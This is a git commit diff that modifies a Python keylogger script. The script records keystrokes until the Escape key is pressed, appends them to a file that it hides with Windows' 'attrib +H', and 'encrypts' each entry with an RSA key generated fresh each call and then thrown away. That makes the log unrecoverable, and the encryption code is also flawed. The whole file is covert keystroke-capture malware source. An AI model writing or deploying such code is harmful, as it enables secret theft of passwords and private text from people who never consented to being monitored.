a4d3d362fbdeef820dfaf73f7a8ac28b745977cb
kun99 <kuns.km@gmail.com>
2023-10-07 15:52:33 +0700

    Encryption for keys stored in file

--- keylogger.py
+++ keylogger.py
@@ -1,18 +1,27 @@
 import keyboard
 import subprocess
+import rsa
+
+def encrypt(message: str) -> str:
+    (pubkey, privkey) = rsa.newkeys(512)
+    encrypted = rsa.encrypt(message.encode('utf8'), pubkey)
+    return encrypted
 
 def create_file():
-    f = open("myfile.txt", "x")
+    f = open("out.txt", "x")
     subprocess.check_call(["attrib","+H","out.txt"])
     f.close()
 
-try:
-    recorded_keys = keyboard.record('Enter')
-    string_ver = keyboard.get_typed_strings(recorded_keys)
-    f = open("./out.txt", "a")
-    for i in string_ver:
-        f.write(i)
-    f.close()
+def log_keys():
+    try:
+        recorded_keys = keyboard.record('Esc')
+        string_ver = keyboard.get_typed_strings(recorded_keys)
+        f = open("./out.txt", "ab")
+        for i in string_ver:
+            f.write(encrypt(i))
+        f.close()
 
-except IOError:
-    create_file()
+    except IOError:
+        create_file()
+
+log_keys()
